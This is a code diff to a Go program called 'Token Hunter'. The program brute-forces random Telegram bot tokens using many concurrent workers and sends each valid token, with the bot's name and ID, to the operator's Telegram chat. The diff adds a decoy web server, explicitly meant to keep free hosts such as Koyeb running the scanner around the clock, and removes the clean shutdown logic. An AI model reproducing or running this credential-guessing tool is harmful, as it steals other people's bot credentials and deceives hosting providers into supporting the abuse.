@@ -4,6 +4,7 @@ import (
     "encoding/json"
     "flag"
     "fmt"
+    "log"
     "math/rand"
     "net/http"
     "net/url"
@@ -17,8 +18,8 @@ import (
 
 var (
     WORKERS     int
-    BOT_TOKEN   = os.Getenv("BOT_TOKEN")    // ENV var
-    CHAT_ID     = os.Getenv("CHAT_ID")      // ENV var
+    BOT_TOKEN   = os.Getenv("BOT_TOKEN")
+    CHAT_ID     = os.Getenv("CHAT_ID")
     activeChan  = make(chan string, 100)
     activeCount int
     mu          sync.Mutex
@@ -38,16 +39,13 @@ func init() {
     flag.IntVar(&WORKERS, "workers", 50, "Ping workers count")
     flag.Parse()
     
-    // Validate ENV vars
     if BOT_TOKEN == "" {
-        fmt.Println("❌ Set BOT_TOKEN env: export BOT_TOKEN='123456:ABC...'")
-        os.Exit(1)
+        log.Fatal("❌ BOT_TOKEN env required")
     }
     if CHAT_ID == "" {
-        fmt.Println("❌ Set CHAT_ID env: export CHAT_ID='123456789'")
-        os.Exit(1)
+        log.Fatal("❌ CHAT_ID env required")
     }
-    fmt.Printf("✅ Config loaded | Workers: %d
+    fmt.Printf("✅ Config OK | Workers: %d
 ", WORKERS)
 }
 
@@ -101,19 +99,11 @@ func infoWorker() {
         if info != nil {
             msg := fmt.Sprintf(
                 "🎉 **Active token #%d**
-"+
-                    "**Bot name:** %s
-"+
-                    "**Bot username:** @%s
-"+
-                    "**Token:** `%s`
-"+
-                    "**ID:** `%d`",
-                activeCount+1,
-                info.Result.FirstName,
-                info.Result.Username,
-                token,
-                info.Result.ID,
+**Bot name:** %s
+**Bot username:** @%s
+**Token:** `%s`
+**ID:** `%d`",
+                activeCount+1, info.Result.FirstName, info.Result.Username, token, info.Result.ID,
             )
             sendMsg(msg)
             mu.Lock()
@@ -131,7 +121,7 @@ func sendMsg(text string) {
 
 func pingWorker(wg *sync.WaitGroup) {
     defer wg.Done()
-    client := &http.Client{Timeout: 2*time.Second}
+    client := &http.Client{Timeout: 2 * time.Second}
     
     for {
         token := generateRandomToken()
@@ -145,47 +135,57 @@ func pingWorker(wg *sync.WaitGroup) {
     }
 }
 
+// 🔥 FAKE WEB SERVER (Koyeb/Render ke liye)
+func fakeWebServer() {
+    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+        mu.Lock()
+        ac := activeCount
+        mu.Unlock()
+        html := fmt.Sprintf(`
+        <!DOCTYPE html>
+        <html>
+        <head><title>Token Hunter</title></head>
+        <body>
+            <h1>🚀 Token Hunter Active</h1>
+            <p><b>Workers:</b> %d</p>
+            <p><b>Active Tokens Found:</b> %d</p>
+            <p><b>Status:</b> Running 24/7 🟢</p>
+            <p>Check your Telegram bot for results!</p>
+        </body>
+        </html>`, WORKERS, ac)
+        w.Header().Set("Content-Type", "text/html")
+        fmt.Fprint(w, html)
+    })
+    
+    http.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
+        w.WriteHeader(200)
+        fmt.Fprint(w, "OK")
+    })
+    
+    // Koyeb port detect
+    port := os.Getenv("PORT")
+    if port == "" {
+        port = "8080"
+    }
+    
+    fmt.Printf("🌐 Fake web on :%s
+", port)
+    log.Fatal(http.ListenAndServe(":"+port, nil))
+}
+
 func main() {
     rand.Seed(time.Now().UnixNano())
-    fmt.Printf("🚀 Secure Token Hunter | Workers: %d | Ctrl+C stop
+    fmt.Printf("🚀 Secure Token Hunter | Workers: %d
 ", WORKERS)
     
+    // Background workers start
     go infoWorker()
-    
-    c := make(chan os.Signal, 1)
-    signal.Notify(c, os.Interrupt, syscall.SIGTERM)
-    
     var wg sync.WaitGroup
     for i := 0; i < WORKERS; i++ {
         wg.Add(1)
         go pingWorker(&wg)
     }
     
-    tested := 0
-    start := time.Now()
-    ticker := time.NewTicker(10 * time.Second)
-    
-    go func() {
-        for {
-            select {
-            case <-c:
-                close(activeChan)
-                wg.Wait()
-                ticker.Stop()
-                return
-            case <-ticker.C:
-                mu.Lock()
-                ac := activeCount
-                mu.Unlock()
-                speed := float64(tested*10) / time.Since(start).Seconds()
-                fmt.Printf("📊 Speed: %.0f/sec | Tested: %d | Active: %d
-", speed, tested*10, ac)
-                tested += 10
-            }
-        }
-    }()
-    
-    <-c
-    fmt.Printf("⏹️ Stopped! Active found: %d
-", activeCount)
+    // FOREGROUND: Fake web server (Koyeb ko happy rakhega)
+    fakeWebServer()
 }
